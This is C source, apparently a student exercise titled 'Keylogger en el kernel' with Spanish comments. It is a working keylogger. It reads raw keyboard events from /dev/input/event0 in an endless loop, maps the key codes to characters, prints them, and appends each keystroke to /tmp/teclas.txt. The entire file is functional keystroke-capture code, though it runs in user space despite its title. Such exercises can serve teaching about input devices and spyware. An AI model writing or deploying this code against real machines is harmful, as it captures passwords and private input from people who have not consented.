//Anota Olmos Oscar David
//Practica 20 - Keylogger en el kernel

#include<stdio.h>
#include<stdlib.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<linux/input.h>
#include<fcntl.h>
#include<unistd.h>
int main(int argc, char *argv[])
{
	struct input_event ev;
	int fdr,rd,dato;//Declaracion de un descriptor de archivos.
	int salida, sal;
	char *teclas ="  1234567890'   qwertyuiop +  asdfghjklñ{} zxcvbnm,.-    "; //caracteres correspondientes a cada tecla
	char *entrada="/dev/input/event0\0"; // se declara la ruta del archivo
	fdr=open(entrada,O_RDONLY); // se abre el archivo en modo de lectura 
  salida=open("/tmp/teclas.txt",O_CREAT|O_WRONLY|O_APPEND);
	if(fdr==-1) fprintf(stderr,"No se pudo abrir o crear el archivo");
	if(salida==-1) fprintf(stderr,"No se pudo abrir o crear el archivo");
	//si se puede leer el archivo se imprime un entero obtenido del archivo 
	
	while(1)
	{
		rd = read(fdr,(void*)&ev,sizeof(struct input_event)); // se lee del archivo event1 estructuras de tipo input_event y se guardan en ev

		 //si la tecla ha sido presionada y se leyó algo del archivo event1, y el valor del evento corresponde a EV_KEY, es decir ,0
		if(rd>0 && ev.value==0 && ev.type==1)
		{
			printf("%c\n",teclas[ev.code]); //se imprime el caracter de la tecla de acuerdo al campo code de la estructura
			sal = write(salida,(void*)&teclas[ev.code], sizeof(teclas[ev.code]) );
		}

	}
	if(close(fdr)==-1) fprintf(stderr,"No se pudo cerrar el descriptor de archivo"); //se cierra el descriptor de archivo
	if(close(salida)==-1) fprintf(stderr,"No se pudo cerrar el descriptor de archivo"); //se cierra el descriptor de archivo
}
